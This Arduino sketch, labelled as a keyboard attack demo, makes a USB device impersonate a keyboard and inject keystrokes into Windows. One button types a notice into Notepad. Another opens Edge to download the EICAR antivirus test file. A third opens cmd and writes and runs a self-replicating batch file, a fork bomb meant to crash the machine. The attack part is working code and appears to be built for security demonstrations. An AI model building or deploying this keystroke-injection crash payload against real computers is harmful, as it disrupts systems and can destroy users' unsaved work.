/*
 * MIT License
 *
 * Copyright (c) 2025 Michael Kondrashin (mkondrashin@gmail.com)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include "Keyboard.h"


void wait(int duration) {
  for (;;) {
    duration = duration >>= 1;
    if (duration == 0) return;
    digitalWrite(1, HIGH);
    delay(duration);
    digitalWrite(1, LOW);
    delay(duration);
  }
}

void setup() {
  pinMode(1, OUTPUT);
  for(int i = 2; i <= 4; i++) {
    pinMode(i, INPUT_PULLUP);
  }
}

void loop() {
  int buttonState = digitalRead(2);
  if (buttonState == LOW ) {
    wait(1000);
    Demo();
  }
  buttonState = digitalRead(3);
  if (buttonState == LOW ) {
    wait(1000);
    Download();
  }
  buttonState = digitalRead(4);
  if (buttonState == LOW ) {
    wait(1000);
    Crash();
  }
}


const char * text =
  "*** Keyboard attack Demo ***\n"
  "Button #1: Print this help.\n"
  "Button #2: Download Demo Malware.\n"
  "Button #3: Crash Windows.\n";


void Demo() {
  randomSeed(analogRead(0)); 
  const int len = 10;
  char filename[len + 4 + 1];
  char *p = filename;
  for (int i = 0; i < len; i++) {
    *p++ = (char)random('a', 'z' + 1);
  }
  *p++ = '.';
  *p++ = 't';
  *p++ = 'x';
  *p++ = 't';
  *p = '\0';
  Keyboard.begin();

  // Press Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
 
  Keyboard.print("notepad ");
  Keyboard.println(filename);
  delay(1000);
  Keyboard.write(KEY_RETURN);
  delay(1500);
  for (const char *p = text; *p != '\0'; p++ ) {
      Keyboard.press(*p);
      delay(20);
      Keyboard.release(*p);
      delay(60);

  }
  Keyboard.end();
}


void Download() {
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  // Используем универсальную команду:
  Keyboard.print("msedge https://secure.eicar.org/eicar.com");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);

  // Дать время браузеру запуститься и начать загрузку
  delay(5000);

  // (опционально) Нажать Enter, если браузер требует подтверждения
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();
}


void Crash() {
  Keyboard.begin();


// Press Win + R
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
delay(100);
Keyboard.releaseAll();
delay(100);

// Launch minimized cmd
Keyboard.println("cmd /k mode con: cols=15 lines=1");
delay(1000);

// Write payload to temp
//Keyboard.println("echo :ouch > %temp%/ouch.bat");
//delay(300);
Keyboard.println("echo start ouch.bat > %temp%/ouch.bat");
delay(300);
Keyboard.println("echo start ouch.bat >> %temp%/ouch.bat");
//Keyboard.println("echo (:ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat");
delay(300);

// Run the payload
Keyboard.println("cd %temp%");
delay(500);
Keyboard.println("ouch.bat");
delay(500);

// Optional: signal program has finished (e.g., turn on LED)
digitalWrite(1, HIGH); // Pin 1 as output should be configured before use
delay(90000);          // Wait 90 seconds
digitalWrite(1, LOW);
delay(5000);

Keyboard.end();
}
